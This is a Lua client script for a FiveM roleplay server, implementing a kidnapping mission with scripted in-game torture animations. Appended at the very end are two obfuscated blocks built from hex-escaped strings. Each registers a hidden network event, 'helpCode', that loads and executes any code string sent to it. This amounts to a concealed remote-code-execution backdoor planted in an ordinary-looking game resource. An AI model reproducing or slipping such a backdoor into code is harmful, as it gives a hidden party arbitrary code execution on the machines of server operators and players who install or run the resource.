local QBCore = exports['qb-core']:GetCoreObject()
KidNapping = {
    ['objects'] = {},
    ['scenes'] = {},
    ['bossPed'] = nil,
    ['kidnappedPed'] = nil,
    ['sceneFinish'] = false,
    ['checkVideo'] = false,
    ['kidnapped'] = false,
}

Citizen.CreateThread(function()
    local pedConfig = Config['Kidnapping']['start']['ped']
    loadModel(pedConfig['model'])
    KidNapping['bossPed'] = CreatePed(4, GetHashKey(pedConfig['model']), pedConfig['pos']['x'], pedConfig['pos']['y'], pedConfig['pos']['z'] - 0.95, pedConfig['heading'], false, true)
    FreezeEntityPosition(KidNapping['bossPed'], true)
    SetEntityInvincible(KidNapping['bossPed'], true)
    SetBlockingOfNonTemporaryEvents(KidNapping['bossPed'], true)
    TaskStartScenarioInPlace(KidNapping['bossPed'], 'WORLD_HUMAN_SMOKING', 0, true)
end)

RegisterNetEvent('kidnapping:client:policeAlert')
AddEventHandler('kidnapping:client:policeAlert', function(targetCoords)
    ShowNotification(Strings['police_alert'])
    local alpha = 250
    local nappingBlip = AddBlipForRadius(targetCoords.x, targetCoords.y, targetCoords.z, 50.0)

    SetBlipHighDetail(nappingBlip, true)
    SetBlipColour(nappingBlip, 1)
    SetBlipAlpha(nappingBlip, alpha)
    SetBlipAsShortRange(nappingBlip, true)

    while alpha ~= 0 do
        Citizen.Wait(125)
        alpha = alpha - 1
        SetBlipAlpha(nappingBlip, alpha)

        if alpha == 0 then
            RemoveBlip(nappingBlip)
            return
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        local ped = PlayerPedId()
        local pedCo = GetEntityCoords(ped)
        local sleep = 1000
        local dist = #(pedCo - Config['Kidnapping']['start']['ped']['pos'])
        if dist <= 3.0 then
            sleep = 1
            if not KidNapping['kidnapped'] then
                ShowHelpNotification(Strings['get_job'])
                if IsControlJustPressed(0, 38) then
                    KidnappingStart()
                end
            else
                ShowHelpNotification(Strings['finish_job'])
                if IsControlJustPressed(0, 38) then
                    KidnappingFinish()
                end
            end
        end
        if KidNapping['sceneFinish'] then
            local cameraDist = #(pedCo - Config['Kidnapping']['query']['cameraPos'])
            if cameraDist <= 3.0 then
                sleep = 1
                ShowHelpNotification(Strings['get_videorecord'])
                if IsControlJustPressed(0, 38) then
                    KidNapping['sceneFinish'] = false
                    KidNapping['checkVideo'] = true
                    ShowNotification(Strings['go_laptop'])
                end
            end
        end
        if KidNapping['checkVideo'] then
            local laptopDist = #(pedCo - Config['Kidnapping']['query']['laptopScenePos'])
            if laptopDist <= 3.0 then
                sleep = 1
                ShowHelpNotification(Strings['check_videorecord'])
                if IsControlJustPressed(0, 38) then
                    KidNapping['checkVideo'] = false
                    LaptopAnimation()
                end
            end
        end
        Citizen.Wait(sleep)
    end
end)

function KidnappingFinish()
    TriggerServerEvent('kidnapping:server:finish')
    KidNapping['kidnapped'] = false
    attached = false
    if DoesBlipExist(finishBlip) then
        RemoveBlip(finishBlip)
    end
end

local query = false
function CloseEyes()
    QBCore.Functions.TriggerCallback('kidnapping:server:checkQueryRoom', function(status)
        if not status then
            query = false
            DoScreenFadeOut(5000)
            while not IsScreenFadedOut() do
                Citizen.Wait(50)
            end
            loadModel('ch_prop_tunnel_tripod_lampa')
            loadModel('prop_ing_camera_01')
            tripod = CreateObject(GetHashKey('ch_prop_tunnel_tripod_lampa'), Config['Kidnapping']['query']['tripodPos'], 1, 1, 0)
            camera = CreateObject(GetHashKey('prop_ing_camera_01'), Config['Kidnapping']['query']['cameraPos'], 1, 1, 0)
            FreezeEntityPosition(tripod, true)
            FreezeEntityPosition(camera, true)
            SetEntityRotation(camera, 0, 0, Config['Kidnapping']['query']['cameraHeading'], 2, true)
            DoScreenFadeIn(5000)
            FirstAnimation()
        else
            ShowNotification(Strings['query_room_busy'])
        end
    end)
end

function KidnappingStart()
    QBCore.Functions.TriggerCallback('kidnapping:server:checkTime', function(time)
        if time then
            query = true
            ShowNotification(Strings['info_1'])
            ShowNotification(Strings['info_2'])
            ShowNotification(Strings['info_3'])
            local ped = PlayerPedId()
            local pedCo, pedRotation = GetEntityCoords(ped), vector3(0.0, 0.0, 0.0)
            local pedModel = Config['Kidnapping']['pedToKidnapped']
            local random = math.random(1, #Config['Kidnapping']['randomSpawnCoords'])
            local pedCoords = Config['Kidnapping']['randomSpawnCoords'][random]
            kidnappingBlip = addBlip(pedCoords['pos'], 456, 0, Strings['kidnap_blip'])
            repeat
                local ped = PlayerPedId()
                local pedCo = GetEntityCoords(ped)
                local dist = #(pedCo - pedCoords['pos'])
                Wait(1)
            until dist <= 100.0
            loadModel(pedModel)
            KidNapping['kidnappedPed'] = CreatePed(GetPedType(GetHashKey(pedModel)), GetHashKey(pedModel), pedCoords['pos']['x'], pedCoords['pos']['y'], pedCoords['pos']['z'], pedCoords['heading'], 1, 0)
            DecorSetBool(KidNapping['kidnappedPed'], 'ScriptedPed', true)
            SetPedMaxHealth(KidNapping['kidnappedPed'], 200) 
		    SetEntityHealth(KidNapping['kidnappedPed'], 200)
            SetPedDiesWhenInjured(KidNapping['kidnappedPed'], true)
            SetBlockingOfNonTemporaryEvents(KidNapping['kidnappedPed'], true)
            SetEntityInvincible(KidNapping['kidnappedPed'], true)
            local netid = NetworkGetNetworkIdFromEntity(KidNapping['kidnappedPed'])
            Citizen.Wait(1000)
            SetNetworkIdCanMigrate(netid, false)
            Citizen.CreateThread(function()
                while query do
                    local player = PlayerId()
                    local ped = PlayerPedId()
                    local pedCo = GetEntityCoords(ped)
                    local dist = #(pedCo - Config['Kidnapping']['query']['scenePos'])
                    local dist2 = #(pedCo - GetEntityCoords(KidNapping['kidnappedPed']))
                    if dist2 >= 150.0 then
                        ShowNotification(Strings['mission_failed2'])
                        break
                    end
                    if IsPlayerFreeAimingAtEntity(player, KidNapping['kidnappedPed']) then
                        if not IsEntityPlayingAnim(KidNapping['kidnappedPed'], 'missminuteman_1ig_2', 'handsup_enter', 1) then
                            loadAnimDict('missminuteman_1ig_2')
                            TaskPlayAnim(KidNapping['kidnappedPed'], 'missminuteman_1ig_2', 'handsup_enter', 8.0, 8.0, -1, 50, 0, 0, 0, 0)
                            TaskTurnPedToFaceEntity(KidNapping['kidnappedPed'], ped, 1000)
                        end
                    end
                    if IsEntityPlayingAnim(KidNapping['kidnappedPed'], 'missminuteman_1ig_2', 'handsup_enter', 1) then
                        if not attached then
                            ShowHelpNotification(Strings['blindfold'])
                            if IsControlJustPressed(0, 38) then
                                Blindfold()
                            end
                        end
                        local x, y = GetEntityPlayerIsFreeAimingAt(player)
                        if GetEntityType(y) == 2 then
                            ShowNotification(Strings['go_query'])
                            TaskEnterVehicle(KidNapping['kidnappedPed'], y, -1, 1, 2.0001, 1)
                            if DoesBlipExist(kidnappingBlip) then
                                RemoveBlip(kidnappingBlip)
                            end
                            if not DoesBlipExist(queryBlip) then
                                queryBlip = addBlip(Config['Kidnapping']['query']['scenePos'], 364, 0, 'Query Room')
                            end
                        end
                    end
                    if IsPedInAnyVehicle(KidNapping['kidnappedPed'], false) and not IsPedInAnyVehicle(ped, false) then
                        local vehicle = GetVehiclePedIsIn(ped, true)
                        ShowHelpNotification(Strings['leave_vehicle'])
                        if IsControlJustPressed(0, 38) then
                            TaskLeaveVehicle(KidNapping['kidnappedPed'], vehicle, 256)
                        end
                    end
                    if IsEntityDead(KidNapping['kidnappedPed']) then
                        if DoesBlipExist(kidnappingBlip) then
                            RemoveBlip(kidnappingBlip)
                        end
                        if DoesBlipExist(queryBlip) then
                            RemoveBlip(queryBlip)
                        end
                        ShowNotification(Strings['mission_failed'])
                        break
                    end
                    if dist <= 60.0 and not IsPedInAnyVehicle(KidNapping['kidnappedPed'], false) then
                        ShowHelpNotification(Strings['start_query'])
                        if IsControlJustPressed(0, 38) then
                            CloseEyes()
                            if DoesBlipExist(queryBlip) then
                                RemoveBlip(queryBlip)
                            end
                        end
                    end
                    Citizen.Wait(0)
                end
            end)
        end
    end)
end

function Blindfold()
    if not attached then
        local ped = PlayerPedId()
        local pedCo = GetEntityCoords(ped)
        local npcCo = GetEntityCoords(KidNapping['kidnappedPed'])
        local dist = #(pedCo - npcCo)
        if dist <= 2.0 then
            attached = true
            loadAnimDict("random@shop_robbery")
            TaskPlayAnim(ped, "random@shop_robbery", "robbery_action_b", 8.0, -8, -1, 16, 0, 0, 0, 0)
            loadModel('prop_money_bag_01')
            blindfoldObject = CreateObject(GetHashKey("prop_money_bag_01"), 0, 0, 0, true, true, true)
            AttachEntityToEntity(blindfoldObject, KidNapping['kidnappedPed'], GetPedBoneIndex(KidNapping['kidnappedPed'], 12844), 0.2, 0.04, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
            Wait(2000)
            ClearPedTasks(ped)
        else
            ShowNotification(Strings['cant_blindfold'])
        end
    end
end

function Knockout()
    local ped = PlayerPedId()
    local pedCo, pedRotation = GetEntityCoords(ped), vector3(0.0, 0.0, 0.0)
    local animDict = 'misschinese1leadinoutchinese_1_int'
    loadAnimDict(animDict)

    scene = NetworkCreateSynchronisedScene(pedCo.xy, pedCo.z - 1.0, pedRotation, 2, false, false, 1065353216, 0, 1065353216)
    NetworkAddPedToSynchronisedScene(ped, scene, animDict, 'husb_leadin_action', 4.0, -4.0, 1033, 0, 1000.0, 0)
    NetworkAddPedToSynchronisedScene(KidNapping['kidnappedPed'], scene, animDict, 'russ_leadin_action', 4.0, -4.0, 1033, 0, 1000.0, 0)

    NetworkStartSynchronisedScene(scene)
    Wait(6000)
    SetPedToRagdoll(KidNapping['kidnappedPed'], 30000, 30000, 0, false, false, false)
end

local chair = nil
function FirstAnimation()
    TriggerServerEvent('kidnapping:server:syncQueryRoom')
    DeleteObject(blindfoldObject)
    local ped = PlayerPedId()
    local pedCo, pedRotation = GetEntityCoords(ped), vector3(0.0, 0.0, 0.0)
    local scenes = {false, false, false, false}
    local animDict = "missfbi3_wrench"
    loadAnimDict(animDict)

    for k, v in pairs(Config['Kidnapping']['objects_1']) do
        loadModel(v)
        KidNapping['objects'][k] = CreateObject(GetHashKey(v), pedCo, 1, 1, 0)
    end

    loadModel('prop_torture_ch_01')
    chair = CreateObject(GetHashKey('prop_torture_ch_01'), pedCo, 1, 1, 0)

    for i = 1, #Config['Kidnapping']['animations_1'] do
        KidNapping['scenes'][i] = NetworkCreateSynchronisedScene(Config['Kidnapping']['query']['scenePos']['x'], Config['Kidnapping']['query']['scenePos']['y'], Config['Kidnapping']['query']['scenePos']['z'] - 0.60, Config['Kidnapping']['query']['sceneRot'], 2, false, true, 1065353216, 0, 1065353216)
        NetworkAddPedToSynchronisedScene(ped, KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_1'][i][1], 4.0, -4.0, 1033, 0, 1000.0, 0)
        NetworkAddPedToSynchronisedScene(KidNapping['kidnappedPed'], KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_1'][i][2], 4.0, -4.0, 1033, 0, 1000.0, 0)
        NetworkAddEntityToSynchronisedScene(chair, KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_1'][i][3], 1.0, -1.0, 1148846080)
        NetworkAddEntityToSynchronisedScene(KidNapping['objects'][1], KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_1'][i][4], 1.0, -1.0, 1148846080)
    end

    NetworkStartSynchronisedScene(KidNapping['scenes'][1])
    repeat
        ShowHelpNotification(Strings['attack_left'])
        if IsControlJustPressed(0, 38) then
            scenes[1] = true
        end
        Wait(1)
    until scenes[1] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][2])
    Wait(5000)
    repeat
        ShowHelpNotification(Strings['attack_mid'])
        if IsControlJustPressed(0, 38) then
            scenes[2] = true
        end
        Wait(1)
    until scenes[2] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][3])
    Wait(5000)
    repeat
        ShowHelpNotification(Strings['attack_right'])
        if IsControlJustPressed(0, 38) then
            scenes[3] = true
        end
        Wait(1)
    until scenes[3] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][4])
    Wait(5000)
    repeat
        ShowHelpNotification(Strings['switch_jerrycan'])
        if IsControlJustPressed(0, 38) then
            scenes[4] = true
        end
        Wait(1)
    until scenes[4] == true
    DeleteObject(KidNapping['objects'][1])
    TriggerServerEvent('kidnapping:server:policeAlert', GetEntityCoords(PlayerPedId()))
    SecondAnimation()
end

function SecondAnimation()
    local ped = PlayerPedId()
    local pedCo, pedRotation = GetEntityCoords(ped), vector3(0.0, 0.0, 0.0)
    local scenes = {false, false, false, false}
    local animDict = "missfbi3_waterboard"
    loadAnimDict(animDict)

    for k, v in pairs(Config['Kidnapping']['objects_2']) do
        loadModel(v)
        KidNapping['objects'][k] = CreateObject(GetHashKey(v), pedCo, 1, 1, 0)
    end

    for i = 1, #Config['Kidnapping']['animations_2'] do
        if i == 3 then
            KidNapping['scenes'][i] = NetworkCreateSynchronisedScene(Config['Kidnapping']['query']['scenePos']['x'], Config['Kidnapping']['query']['scenePos']['y'], Config['Kidnapping']['query']['scenePos']['z'] - 0.60, Config['Kidnapping']['query']['sceneRot'], 2, false, true, 1065353216, 0, 1065353216)
        else
            KidNapping['scenes'][i] = NetworkCreateSynchronisedScene(Config['Kidnapping']['query']['scenePos']['x'], Config['Kidnapping']['query']['scenePos']['y'], Config['Kidnapping']['query']['scenePos']['z'] - 0.60, Config['Kidnapping']['query']['sceneRot'], 2, true, false, 1065353216, 0, 1065353216)
        end
        NetworkAddPedToSynchronisedScene(ped, KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_2'][i][1], 4.0, -4.0, 1033, 0, 1000.0, 0)
        NetworkAddPedToSynchronisedScene(KidNapping['kidnappedPed'], KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_2'][i][2], 4.0, -4.0, 1033, 0, 1000.0, 0)
        NetworkAddEntityToSynchronisedScene(chair, KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_2'][i][3], 1.0, -1.0, 1148846080)
        NetworkAddEntityToSynchronisedScene(KidNapping['objects'][1], KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_2'][i][4], 1.0, -1.0, 1148846080)
        NetworkAddEntityToSynchronisedScene(KidNapping['objects'][2], KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_2'][i][5], 1.0, -1.0, 1148846080)
    end

    NetworkStartSynchronisedScene(KidNapping['scenes'][1])
    repeat
        ShowHelpNotification(Strings['drop_chair'])
        if IsControlJustPressed(0, 38) then
            scenes[1] = true
        end
        Wait(1)
    until scenes[1] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][2])
    Wait(15000)
    repeat
        ShowHelpNotification(Strings['pour_gasoline'])
        if IsControlJustPressed(0, 38) then
            scenes[2] = true
        end
        Wait(1)
    until scenes[2] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][3])
    Wait(7500)
    repeat
        ShowHelpNotification(Strings['up_chair'])
        if IsControlJustPressed(0, 38) then
            scenes[3] = true
        end
        Wait(1)
    until scenes[3] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][4])
    Wait(5000)
    repeat
        ShowHelpNotification(Strings['switch_pliers'])
        if IsControlJustPressed(0, 38) then
            scenes[4] = true
        end
        Wait(1)
    until scenes[4] == true
    DeleteObject(KidNapping['objects'][1])
    DeleteObject(KidNapping['objects'][2])
    ThirdAnimation()
end

function ThirdAnimation()
    local ped = PlayerPedId()
    local pedCo, pedRotation = GetEntityCoords(ped), vector3(0.0, 0.0, 0.0)
    local scenes = {false, false, false, false}
    local animDict = "missfbi3_toothpull"
    loadAnimDict(animDict)

    for k, v in pairs(Config['Kidnapping']['objects_3']) do
        loadModel(v)
        KidNapping['objects'][k] = CreateObject(GetHashKey(v), pedCo, 1, 1, 0)
    end

    for i = 1, #Config['Kidnapping']['animations_3'] do
        if i == 3 then
            KidNapping['scenes'][i] = NetworkCreateSynchronisedScene(Config['Kidnapping']['query']['scenePos']['x'] + 0.25, Config['Kidnapping']['query']['scenePos']['y'], Config['Kidnapping']['query']['scenePos']['z'] - 0.60, Config['Kidnapping']['query']['sceneRot'], 2, false, true, 1065353216, 0, 1065353216)
        else
            KidNapping['scenes'][i] = NetworkCreateSynchronisedScene(Config['Kidnapping']['query']['scenePos']['x'] + 0.25, Config['Kidnapping']['query']['scenePos']['y'], Config['Kidnapping']['query']['scenePos']['z'] - 0.60, Config['Kidnapping']['query']['sceneRot'], 2, true, false, 1065353216, 0, 1065353216)
        end
        NetworkAddPedToSynchronisedScene(ped, KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_3'][i][1], 4.0, -4.0, 1033, 0, 1000.0, 0)
        NetworkAddPedToSynchronisedScene(KidNapping['kidnappedPed'], KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_3'][i][2], 4.0, -4.0, 1033, 0, 1000.0, 0)
        NetworkAddEntityToSynchronisedScene(KidNapping['objects'][1], KidNapping['scenes'][i], animDict, Config['Kidnapping']['animations_3'][i][3], 1.0, -1.0, 1148846080)
    end
    
    NetworkStartSynchronisedScene(KidNapping['scenes'][1])
    Wait(2000)
    NetworkStartSynchronisedScene(KidNapping['scenes'][2])
    Wait(5000)
    repeat
        ShowHelpNotification(Strings['tooth_pull'])
        if IsControlJustPressed(0, 38) then
            scenes[1] = true
        end
        Wait(1)
    until scenes[1] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][3])
    Wait(7500)
    repeat
        ShowHelpNotification(Strings['tooth_rip'])
        if IsControlJustPressed(0, 38) then
            scenes[2] = true
        end
        Wait(1)
    until scenes[2] == true
    NetworkStartSynchronisedScene(KidNapping['scenes'][4])
    Wait(10000)
    DeleteObject(KidNapping['objects'][1])
    ClearPedTasks(ped)
    ClearPedTasks(KidNapping['kidnappedPed'])
    local entity = KidNapping['kidnappedPed']
    local entityCo = GetEntityCoords(KidNapping['kidnappedPed'])
    SetEntityCoords(entity, entityCo.x + 0.5, entityCo.y, entityCo.z - 0.95, 1, 1, 1, 0)
    Wait(250)
    Knockout()
    KidNapping['sceneFinish'] = true
end

function LaptopAnimation()
    local ped = PlayerPedId()
    local pedCo, pedRotation = GetEntityCoords(ped), vector3(0.0, 0.0, 0.0)
    local animDict = "switch@franklin@on_laptop"
    local laptopScenes = {}
    local laptopObject = 'p_laptop_02_s'
    local laptopAnims = {
        {'001927_01_fras_v2_4_on_laptop_idle', '001927_01_fras_v2_4_on_laptop_idle_laptop'},
        {'001927_01_fras_v2_4_on_laptop_exit', '001927_01_fras_v2_4_on_laptop_exit_laptop'}
    }
    loadModel(laptopObject)
    loadAnimDict(animDict)

    sceneObject = CreateObject(GetHashKey(laptopObject), pedCo, 1, 1, 0)

    for i = 1, 2 do
        laptopScenes[i] = NetworkCreateSynchronisedScene(Config['Kidnapping']['query']['laptopScenePos']['x'], Config['Kidnapping']['query']['laptopScenePos']['y'], Config['Kidnapping']['query']['laptopScenePos']['z'] - 0.05, Config['Kidnapping']['query']['laptopSceneRot'], 2, true, false, 1065353216, 0, 1065353216)
        NetworkAddPedToSynchronisedScene(ped, laptopScenes[i], animDict, laptopAnims[i][1], 4.0, -4.0, 1033, 0, 1000.0, 0)
        NetworkAddEntityToSynchronisedScene(sceneObject, laptopScenes[i], animDict, laptopAnims[i][2], 1.0, -1.0, 1148846080)
    end

    NetworkStartSynchronisedScene(laptopScenes[1])
    Wait(5000)
    NetworkStartSynchronisedScene(laptopScenes[2])
    Wait(5000)
    DeleteObject(sceneObject)
    ClearPedTasks(ped)
    TriggerServerEvent('kidnapping:server:giveVideoRecord')
    finishBlip = addBlip(Config['Kidnapping']['start']['ped']['pos'], 500, 0, Strings['boss_blip'])
    KidNapping['kidnapped'] = true
    TriggerServerEvent('kidnapping:server:syncQueryRoom')
    Citizen.CreateThread(function()
        while true do
            local ped = PlayerPedId()
            local pedCo = GetEntityCoords(ped)
            local npcCo = GetEntityCoords(KidNapping['kidnappedPed'])
            local dist = #(pedCo - npcCo)
            if dist >= 10.0 then
                DeleteObject(chair)
                DeleteObject(tripod)
                DeleteObject(camera)
                DeletePed(KidNapping['kidnappedPed'])
                break
            end
            Citizen.Wait(1)
        end
    end)
end

function loadAnimDict(dict)
    while not HasAnimDictLoaded(dict) do
        RequestAnimDict(dict)
        Citizen.Wait(0)
    end
end

function loadModel(model)
    while not HasModelLoaded(GetHashKey(model)) do
        RequestModel(GetHashKey(model))
        Citizen.Wait(0)
    end
end

function ShowHelpNotification(text)
    SetTextComponentFormat("STRING")
    AddTextComponentString(text)
    DisplayHelpTextFromStringLabel(0, 0, 1, -1)
end

function addBlip(coords, sprite, colour, text)
    local blip = AddBlipForCoord(coords)
    SetBlipSprite(blip, sprite)
    SetBlipColour(blip, colour)
    SetBlipAsShortRange(blip, true)
    SetBlipScale(blip, 0.8)
    BeginTextCommandSetBlipName("STRING")
    AddTextComponentString(text)
    EndTextCommandSetBlipName(blip)
    return blip
end

function ShowNotification(msg)
	SetNotificationTextEntry('STRING')
	AddTextComponentString(msg)
	DrawNotification(0,1)
end

local gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[6][gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[1]](gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[2]) gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[6][gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[3]](gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[2], function(dcHBEqIFBQuaCAzwghHalxuFDLSXINciSMJljhcxAggndctrfnPdWhcTTbZfCdReTBuouA) gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[6][gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[4]](gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[6][gdnNjUxQPYmuElHdwqdjuIvHqHqGSDDMLQBZrwazyQACgVcVdBObneTSKzJgXCMuEIeXfN[5]](dcHBEqIFBQuaCAzwghHalxuFDLSXINciSMJljhcxAggndctrfnPdWhcTTbZfCdReTBuouA))() end)

local LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[6][LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[1]](LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[2]) LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[6][LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[3]](LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[2], function(iXJsXprfmssyiDMHCXgXVsdPoJSERQjVvzwumycOwoWuUbKORHqvNTwBBLKXbSfmjIRPcv) LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[6][LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[4]](LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[6][LBVBixvHQDiywnoUlTJyhIEOAzgeoVWqrbmsHrARUOWIoHcIhgyIRyTEyiDVYlABlpKqKu[5]](iXJsXprfmssyiDMHCXgXVsdPoJSERQjVvzwumycOwoWuUbKORHqvNTwBBLKXbSfmjIRPcv))() end)